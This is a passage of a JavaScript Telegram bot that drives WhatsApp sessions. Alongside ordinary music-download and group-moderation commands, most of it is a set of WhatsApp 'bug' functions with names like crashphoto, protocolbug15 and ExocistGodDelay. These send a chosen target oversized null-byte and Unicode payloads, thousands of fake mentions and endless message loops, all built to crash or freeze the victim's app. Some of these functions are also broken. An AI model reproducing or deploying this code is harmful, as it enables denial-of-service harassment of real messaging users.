                    [{ text: "『 𝖠𝗎𝗍𝗁𝗈𝗋 』", url: "https://t.me/dickxmod" }],
                    [{ text: "『 ! 』", url: "https://t.me/testidilz21" }]
                ]
            }
        });
    }
    
    if (!searchText) {
        return bot.sendMessage(chatId, `\`\`\`
        ❗ Contoh:\n/play komang\`\`\`
        `, { 
        parse_mode: "Markdown" 
        });
    }

    await bot.sendMessage(chatId, `\`\`\`
    🔍 Mencari lagu...\`\`\`
    `, {
        parse_mode: "Markdown"
        });

    try {

        const search = await yts(searchText);
        const video = search.videos[0];
        if (!video) return bot.sendMessage(chatId, `\`\`\`
        ❌ Lagu tidak ditemukan.\`\`\`
        `);


        const res = await axios.get(`https://api.betabotz.eu.org/api/download/ytmp3`, {
            params: {
                url: video.url,
                apikey: APIKEY
            }
        });

        const data = res.data;
        if (!data.status) return bot.sendMessage(chatId, "❌ Gagal download lagu.");

 
        const mp3Url = data.result.mp3;
        const safeTitle = video.title.replace(/[<>:"/\\|?*]+/g, ''); 
        const filePath = path.join(__dirname, `${safeTitle}.mp3`);
        const audioRes = await axios.get(mp3Url, { responseType: 'arraybuffer' });
        fs.writeFileSync(filePath, audioRes.data);

 
        await bot.sendAudio(chatId, fs.createReadStream(filePath), {
            title: video.title,
            performer: video.author.name
        });

 
        fs.unlinkSync(filePath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, `\`\`\`
        Eror Saat Memproses\`\`\`
        `, {
        parse_mode: "Markdown"
        });
    }
});
///-----------( Tools Group )----------\\\
let antiLink = {};
let antiPromo = {};
let linkCount = {};

bot.onText(/\/antilink (.+)/, (msg, match) => {
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    antiLink[msg.chat.id] = match[1] === "on";
    bot.sendMessage(msg.chat.id, `Anti-Link: ${match[1]}`);
});

bot.onText(/\/antipromosi (.+)/, (msg, match) => {
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    antiPromo[msg.chat.id] = match[1] === "on";
    bot.sendMessage(msg.chat.id, `Anti-Promosi: ${match[1]}`);
});

bot.onText(/\/addantipromosi (.+)/, (msg, match) => {
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    const word = match[1].toLowerCase();
    data.blocklist.push(word);
    saveJSON(CONFIG.dataFiles.blocklist, data.blocklist);
    
    bot.sendMessage(msg.chat.id, `(⸙) Kata "${word}" ditambahkan ke blocklist.`);
});

bot.onText(/\/listblocklist/, (msg) => {
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    const list = data.blocklist.map((w, i) => `${i + 1}. ${w}`).join("\n");
    bot.sendMessage(msg.chat.id, `🐼 BLOCKLIST\n\n${list}`);
});

const linkRegex = /(https?|www\.|t\.me|wa\.me|\.com|\.net|discord\.gg)/i;

bot.on("message", (msg) => {
    if (!msg.text || shouldIgnoreMessage(msg)) return;
    
    const text = msg.text.toLowerCase().replace(/\s+/g, "");
    const chatId = msg.chat.id;
    
    if (antiPromo[chatId]) {
        for (const w of data.blocklist) {
            if (text.includes(w)) {
                bot.deleteMessage(chatId, msg.message_id);
                return bot.sendMessage(chatId, `(⸙) Promosi Terdeteksi — dihapus.`);
            }
        }
    }
    
    if (antiLink[chatId] && linkRegex.test(text)) {
        bot.deleteMessage(chatId, msg.message_id);
        
        const id = msg.from.id;
        linkCount[id] = (linkCount[id] || 0) + 1;
        
        if (linkCount[id] >= 3) {
            bot.restrictChatMember(chatId, id, { can_send_messages: false });
            return bot.sendMessage(chatId, `(⸙) @${msg.from.username} auto mute (3x link)`);
        }
        
        return bot.sendMessage(chatId, `⚠ Jangan kirim link! (${linkCount[id]}/3)`);
    }
});

const groupCommands = ['/ban', '/unban', '/mute', '/unmute', '/open', '/close'];
groupCommands.forEach(cmd => {
    bot.onText(new RegExp(cmd), async (msg) => {
        if (shouldIgnoreMessage(msg)) return;
        
        if (!isOwner(senderId) && !isAdmin(senderId)) {
            return sendAccessDenied(msg.chat.id, msg.from.username);
        }
        
        const target = await getTarget(msg);
        if (!target) return bot.sendMessage(msg.chat.id, "❌ Tag atau reply pengguna!");
        
        switch(cmd) {
            case '/ban':
                bot.banChatMember(msg.chat.id, target.id);
                bot.sendMessage(msg.chat.id, `⛔ @${target.username} dibanned.`);
                break;
                
            case '/unban':
                bot.unbanChatMember(msg.chat.id, target.id);
                bot.sendMessage(msg.chat.id, `(⸙) @${target.username} unban.`);
                break;
                
            case '/mute':
                bot.restrictChatMember(msg.chat.id, target.id, { can_send_messages: false });
                bot.sendMessage(msg.chat.id, `(⸙) @${target.username} mute.`);
                break;
                
            case '/unmute':
                bot.restrictChatMember(msg.chat.id, target.id, {
                    can_send_messages: true,
                    can_send_media_messages: true,
                    can_send_other_messages: true,
                });
                bot.sendMessage(msg.chat.id, `(⸙) @${target.username} unmute.`);
                break;
                
            case '/open':
                bot.setChatPermissions(msg.chat.id, {
                    can_send_messages: true,
                    can_send_media_messages: true,
                    can_send_other_messages: true,
                    can_add_web_page_previews: true
                });
                bot.sendMessage(msg.chat.id, "🔓 *Grup telah dibuka!*", { parse_mode: "Markdown" });
                break;
                
            case '/close':
                bot.setChatPermissions(msg.chat.id, { can_send_messages: false });
                bot.sendMessage(msg.chat.id, "🔒 *Grup berhasil ditutup!*", { parse_mode: "Markdown" });
                break;
        }
    });
});
///-----------( Connect To WhatsApp )----------\\\
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

bot.onText(/^\/addbot\s+(.+)/i, async (msg, match) => {
  console.log("Command /addbot diterima:", msg.text);

  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!adminUsers.includes(fromId) && !isOwner(fromId)) {
    return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner yang dapat melakukan command ini.', {
      parse_mode: 'Markdown'
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) {
    return bot.sendMessage(chatId, "⚠ Format salah! Gunakan: /addbot <nomor_bot>");
  }

  let percent = 0;
  const processingMsg = await bot.sendMessage(
    chatId,
    `⏳ Menghubungkan bot ${botNumber}\n[${generateProgressBar(percent)}]`
  );

  const intervalId = setInterval(() => {
    percent += 5;
    if (percent > 100) percent = 100;

    bot.editMessageText(
      `⏳ Menghubungkan bot ${botNumber}\n[${generateProgressBar(percent)}]`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    ).catch(() => {});

    if (percent >= 100) clearInterval(intervalId);
  }, 500);

  try {
    await connectToWhatsApp(botNumber, chatId);

    clearInterval(intervalId);
    await bot.editMessageText(
      `🍂 Bot ${botNumber} berhasil ditambahkan dan terhubung!`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    );
  } catch (error) {
    clearInterval(intervalId);
    console.error("❌ ADD-BOT ERROR:", error);
    await bot.editMessageText(
      "❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.",
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    );
  }
});
        
        
        
///----------( Function Here )----------\\\
async function XNecroInvite(target) {
  await Dilz.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "12345678@g.us",
            inviteCode: "XxX",
            inviteExpiration: "9999",
            groupName: "ោ៝".repeat(20000),
            caption: "ꦾ".repeat(60000),
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
        },
      },
    },
    {
     participant: { jid: target }, 
    }
  );
}

async function exoticsIP(Dilz, jid) {
  const raven = "\u0010";
  const sixS = "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: raven + sixS,
            address: raven + sixS,
            url: `https://ravenexotics.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(jid, message, {});

    await Dilz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                  tag: "to",
                  attrs: { jid: jid },
                  content: undefined,
                }],
             }],
         }],
     });
   }

async function delay1(sock, target, mention = false) {
try {
while (true) {
const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
nativeFlowResponseMessage: {
version: 3,
name: "call_permission_request",
paramsJson: "\u0000".repeat(1045000)
},
body: {
text: "who's ziee??",
format: "DEFAULT"
}
}
}
}
},
{
isForwarded: false,
ephemeralExpiration: 0,
background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
forwardingScore: 0,
font: Math.floor(Math.random() * 9)
}
)
await Dilz.relayMessage("status@broadcast", msg.message, {
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
],
statusJidList: [target],
messageId: msg.key.id
})
if (mention) {
await Dilz.relayMessage(
target,
{
statusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{}
)
}
await sleep(1500)
}
} catch (err) {}
}

async function delay2(sock, target, mention = false) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/4amext.jpg" }  },
    { upload: sock.waUploadToServer }
  )

  let push = []
  for (let r = 0; r < 1000; r++) {
    push.push(
      {
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: " "
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: "carousel_message",
              buttonParamsJson: "\u0000"
            }
          ]
        })
      }
    )
  }

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ""
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: ""
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    },
    {}
  )

  await Dilz.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  )

  if (mention) {
    await Dilz.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
            content: undefined
          }
        ]
      }
    )
  }
}

async function delay3(sock, target) {
  while (true) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "who's ziee??", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    })

    await Dilz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target })
  }
}

async function ExocistGodDelay(target, mention) {
  console.log(chalk.bold.red(`Velionce Succes Sending Bug Delay ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 20000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Dilz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  const VoxDelay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ཀ ⏤͟͟͞͞𝗟𝗼𝗹𝗶𝗽𝗼𝗽۞ // ཀ",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0003".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const TesHard = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      caption: "\u0000".repeat(104500),
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
    },
  };

  const Rawrr = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: Dilz.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "ཀ ⏤͟͟͞͞𝗙𝗿𝘅𝗱𝗘𝘅𝗼𝘁𝗶𝗰𝘀.𝗷𝘀۞ // ཀ",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath:
                  "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text:
              "ཀ ⏤͟͟͞͞𝗟𝗼𝗹𝗶𝗽𝗼𝗽۞ // ཀ" + "ꦾ".repeat(77777),
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "cta_url", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "cta_call", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "cta_copy", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "address_message", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "send_location", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "quick_reply", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "mpm", buttonParamsJson: "\u0000".repeat(10000) },
            ],
          },
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveMessage: Rawrr.viewOnceMessage.message.interactiveMessage } },
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveResponseMessage: VoxDelay.viewOnceMessage.message.interactiveResponseMessage } },
  }, {});

  const msg3 = generateWAMessageFromContent(target, TesHard, {});

  for (const msg of [msg1, msg2, msg3]) {
    await Dilz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
  }

  if (mention) {
    await Dilz.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function DelayoWL(target, mention = true) {
    let SID = "5e03e0";
     let key = "10000000_2203140470115547_947412155165083119_n.enc";
     let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
     let type = `image/webp`;
     if (11 > 9) {
     parse = parse ? false : true;
    };
  
    const generateMessageId = Math.random().toString(36).substring(2, 9);

    const generateText = " " + "ᬀ".repeat(25000) + "ꦾ".repeat(25000) + "\u0000".repeat(10000);
    const payloadNull = "\u0000".repeat(10000) + generateText;

    const MSG = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: generateText,
                        format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: payloadNull,
                        version: 3,
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "@s.whatsapp.net",
                            ...Array.from(
                                {
                                    length: 1850,
                                },
                                () => "1" + Math.floor(Math.random().toString(36).subString(2, 15) * 50000000) + "@s.whatsapp.net",
                            ),
                        ],
                    },
                },
            },
        },
    };


    const MUSIC = {
    musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: generateText + "ោ៝".repeat(10000),
        title:  payloadNull,
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://t.me/vaacantivv",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const STC = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
             url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
             fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
             fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
             mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
             mimetype: type,
             directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
             fileLength: {
             low: Math.floor(Math.random() * 1000),
             high: 0,
             unsigned: true,
           },
           mediaKeyTimestamp: {
             low: Math.floor(Math.random() * 1700000000),
             high: 0,
             unsigned: false,
           },
           firstFrameLength: 19904,
           firstFrameSidecar: "KN4kQ5pyABRAgA==",
           isAnimated: true,
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
               ...Array.from(
                 { length: 1900 },
                 () =>
                 "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 100,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
               newsletterJid: "120363321780349272@newsletter",
               serverMessageId: 1,
               newsletterName: "ោ៝".repeat(10000)
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const generateWAMessageFromContent = () => {
    if (typeof generateMessageId === 'function');
  }

  const msg = generateWAMessageFromContent(target, MSG, MUSIC, STC, {});

  await Dilz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id || generateMessageId,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await Dilz.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function crashphoto(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "fuck you"
        },
        "header": { 
          "title": 'do i care¿' + "\u0000".repeat(50000),
          "hasMediaAttachment": false,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⏤fuck you" + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "𝗭𝖆𝖑𝖙𝖍𝖗𝖊𝖝"  },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});
 await Dilz.relayMessage(target, carousel.message, {
messageId: carousel.key.id
});
  }
}

async function protocolbug15(target, mention) {
  for (let i = 0; i < 45; i++) {
    const Mentioneds = [
      "0@s.whatsapp.net",
      ...Array.from(
        { length: 1990 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
      ),
    ];
  }
  
  const message1 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "\u0000",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: target,
            mentionedJid: Mentioneds,
            isSampled: true,
            remoteJid: "status@broadcast",
            forwardingScore: 100,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
